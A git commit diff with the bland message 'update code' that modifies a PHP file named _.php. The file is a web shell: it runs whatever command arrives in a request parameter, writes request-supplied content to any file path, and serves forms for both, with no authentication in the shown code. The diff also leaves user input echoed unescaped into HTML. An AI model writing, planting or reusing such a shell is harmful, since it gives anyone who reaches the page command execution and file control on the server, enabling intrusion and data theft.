c9818d500f22d441f5b648efb2fcdf0b5c268f03
o0o52lin <237277669@qq.com>
2023-09-09 11:35:33 +0800

    update code

--- _.php
+++ _.php
@@ -5,8 +5,12 @@ if($_REQUEST['do']){
     $cmd = trim($_REQUEST['cmd']);
     $content = trim($_REQUEST['content']);
     if ($cmd == '') {
-        $file && $content && file_put_contents($file, $content);
-        echo nl2br("ok\n").contentform();
+        if($file && $content){
+            file_put_contents($file, $content);
+            echo nl2br("ok\n").contentform($file, $content);
+        }else{
+            echo nl2br("fail\n").contentform($file, $content);
+        }
     }else{
         $output = array();
         $returnValue = 0;
@@ -17,10 +21,10 @@ if($_REQUEST['do']){
         // 检查返回值以确定命令是否成功执行
         if ($returnValue === 0) {
             // 输出正确的结果
-            echo nl2br("Command executed successfully.\n\nOutput:\n".implode("\n", $output)."\n").cmdform();
+            echo cmdform().nl2br("Command executed successfully.\n\nOutput:\n".implode("\n", $output)."\n");
         } else {
             // 输出错误信息
-            echo nl2br("Command failed to execute.\n\nError:\n".implode("\n", $output)."\n").cmdform();
+            echo cmdform().nl2br("Command failed to execute.\n\nError:\n".implode("\n", $output)."\n");
         }
     }
 
@@ -32,19 +36,15 @@ if($_REQUEST['do']){
     echo cmdform().contentform();
 }
 
-function cmdform(){
+function cmdform($cmd){
     return <<<HTML
     <form action="/_.php?do=1" method="post">
-        <textarea name="cmd" style="width:95vw;height:10vh"></textarea>
+        <textarea name="cmd" style="width:95vw;height:10vh">{$cmd}</textarea>
         <p><button type="submit">提交</button></p>
     </form>
 HTML;
 }
-function contentform(){
-    $file = $_GET['f'];
-    if($file){
-        $content = file_get_contents($file);
-    }
+function contentform($file, $content){
     return <<<HTML
     <form action="/_.php?do=1&f={$file}" method="post">
         <textarea name="content" style="width:95vw;height:70vh">{$content}</textarea>
